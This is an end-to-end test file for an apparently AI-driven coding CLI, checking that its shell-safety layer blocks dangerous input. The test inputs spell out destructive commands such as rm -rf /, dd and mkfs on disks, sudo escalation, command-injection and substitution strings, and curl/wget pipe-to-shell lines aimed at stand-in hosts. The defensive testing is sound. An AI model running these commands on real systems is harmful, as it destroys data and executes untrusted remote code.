/**
 * @fileoverview E2E tests for shell command safety validation
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { spawn } from 'child_process';
import { writeFileSync, existsSync, mkdirSync, rmSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

interface CLITestResult {
  exitCode: number;
  stdout: string;
  stderr: string;
}

class CLITestRig {
  private tempDir: string;
  private configPath: string;

  constructor() {
    this.tempDir = join(tmpdir(), `cli-coder-safety-test-${Date.now()}`);
    this.configPath = join(this.tempDir, 'config.json');
  }

  setup(allowDangerous: boolean = false): void {
    mkdirSync(this.tempDir, { recursive: true });

    const testConfig = {
      llm: {
        provider: 'openai',
        model: 'gpt-4',
        apiKey: 'test-key-for-safety-e2e',
        maxTokens: 2000,
        temperature: 0.7,
      },
      shell: {
        allowDangerousCommands: allowDangerous,
        defaultTimeout: 10000,
        confirmationRequired: false,
        historySize: 100,
      },
    };

    writeFileSync(this.configPath, JSON.stringify(testConfig, null, 2));
  }

  cleanup(): void {
    if (existsSync(this.tempDir)) {
      rmSync(this.tempDir, { recursive: true, force: true });
    }
  }

  async runInteractiveCLI(commands: string[]): Promise<CLITestResult> {
    return new Promise((resolve, reject) => {
      const cli = spawn('node', ['dist/cli.js', 'chat'], {
        cwd: process.cwd(),
        env: {
          ...process.env,
          CLI_CODER_CONFIG_PATH: this.configPath,
          CI: 'true',
        },
        stdio: ['pipe', 'pipe', 'pipe'],
      });

      let stdout = '';
      let stderr = '';

      cli.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      cli.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      cli.on('close', (code) => {
        resolve({
          exitCode: code || 0,
          stdout,
          stderr,
        });
      });

      cli.on('error', (error) => {
        reject(error);
      });

      // Send commands sequentially
      const sendNextCommand = (index: number) => {
        if (index < commands.length) {
          cli.stdin.write(commands[index] + '\n');
          setTimeout(() => sendNextCommand(index + 1), 1000);
        } else {
          cli.stdin.write('/exit\n');
        }
      };

      setTimeout(() => sendNextCommand(0), 2000);
    });
  }
}

describe('Shell Command Safety E2E', () => {
  let testRig: CLITestRig;

  beforeEach(() => {
    testRig = new CLITestRig();
  });

  afterEach(() => {
    testRig.cleanup();
  });

  describe('Dangerous Command Blocking', () => {
    beforeEach(() => {
      testRig.setup(false); // Don't allow dangerous commands
    });

    it('should block rm -rf commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell rm -rf /tmp/test']);

      // Assert
      expect(result.exitCode).toBe(0); // CLI shouldn't crash
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block sudo commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell sudo rm important-file']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block dd commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell dd if=/dev/zero of=/dev/sda']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block chmod 777 commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell chmod 777 /etc/passwd']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block mkfs commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell mkfs.ext4 /dev/sda1']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block shutdown commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell shutdown -h now']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block kill commands targeting system processes', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell kill -9 1']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);
  });

  describe('Command Injection Prevention', () => {
    beforeEach(() => {
      testRig.setup(false);
    });

    it('should block semicolon injection attempts', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell ls; rm -rf /']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('injection');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block AND injection attempts', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell echo hello && rm important-file']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('injection');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block pipe injection with dangerous commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell ls | rm -rf /']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block backtick command substitution', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell echo `rm -rf /`']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('substitution');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);

    it('should block dollar command substitution', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell echo $(rm -rf /)']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('substitution');
      expect(result.stdout).not.toContain('Command completed');
    }, 30000);
  });

  describe('Safe Command Execution', () => {
    beforeEach(() => {
      testRig.setup(false);
    });

    it('should allow safe git commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/git status']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toMatch(/(Git command completed|Git command failed)/);
    }, 30000);

    it('should allow safe npm commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/npm --version']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toMatch(/(NPM command completed|NPM command failed)/);
    }, 30000);

    it('should allow safe file listing commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell ls -la']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('Command completed');
    }, 30000);

    it('should allow safe text processing commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell echo "test content" > test.txt',
        '/shell cat test.txt',
        '/shell grep "test" test.txt',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('Command completed');
    }, 30000);

    it('should allow which and whereis commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell which node',
        '/shell which npm',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('Command completed');
    }, 30000);
  });

  describe('Edge Cases and Evasion Attempts', () => {
    beforeEach(() => {
      testRig.setup(false);
    });

    it('should block obfuscated rm commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell r""m -rf /',
        '/shell "rm" -rf /',
        '/shell /bin/rm -rf /',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
    }, 30000);

    it('should block privilege escalation attempts', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell su root',
        '/shell sudo -s',
        '/shell sudo su',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
    }, 30000);

    it('should block device access attempts', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell cat /dev/sda',
        '/shell echo data > /dev/sda',
        '/shell dd if=/dev/urandom of=/dev/sda',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
    }, 30000);

    it('should block script execution from remote sources', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell curl -s malicious-site.com | sh',
        '/shell wget -O- evil.com | bash',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
    }, 30000);
  });

  describe('Configuration-Based Safety', () => {
    it('should respect allowDangerousCommands setting when true', async () => {
      // Arrange
      testRig.setup(true); // Allow dangerous commands

      // Act - This is still dangerous and should require confirmation
      // Since we have confirmationRequired: false, it would execute
      // But we're testing the configuration path, not actually executing dangerous commands
      const result = await testRig.runInteractiveCLI(['/shell echo "testing dangerous mode"']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('Command completed');
    }, 30000);

    it('should apply timeout settings', async () => {
      // Arrange
      testRig.setup(false);

      // Act - Test a command that should complete quickly
      const result = await testRig.runInteractiveCLI(['/shell echo "timeout test"']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('Command completed');
    }, 30000);
  });

  describe('Error Messages and User Guidance', () => {
    beforeEach(() => {
      testRig.setup(false);
    });

    it('should provide helpful error messages for blocked commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell rm -rf /']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).toMatch(/(blocked|prevented|not allowed)/i);
    }, 30000);

    it('should suggest safer alternatives when possible', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell sudo cat /etc/passwd']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      // Should suggest not using sudo for read operations
    }, 30000);

    it('should explain why commands are blocked', async () => {
      // Act
      const result = await testRig.runInteractiveCLI(['/shell chmod 777 file']);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).toMatch(/(security|permission|risk)/i);
    }, 30000);
  });

  describe('Multiple Command Scenarios', () => {
    beforeEach(() => {
      testRig.setup(false);
    });

    it('should continue blocking after one dangerous command', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell rm -rf /',
        '/shell sudo rm file',
        '/shell echo "should still work"',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('dangerous');
      expect(result.stdout).toContain('should still work');
    }, 30000);

    it('should handle mixed safe and dangerous commands', async () => {
      // Act
      const result = await testRig.runInteractiveCLI([
        '/shell ls',
        '/shell rm -rf /',
        '/shell pwd',
        '/shell sudo rm file',
        '/shell echo "final test"',
      ]);

      // Assert
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('Command completed'); // For safe commands
      expect(result.stdout).toContain('dangerous'); // For dangerous commands
      expect(result.stdout).toContain('final test');
    }, 30000);
  });
});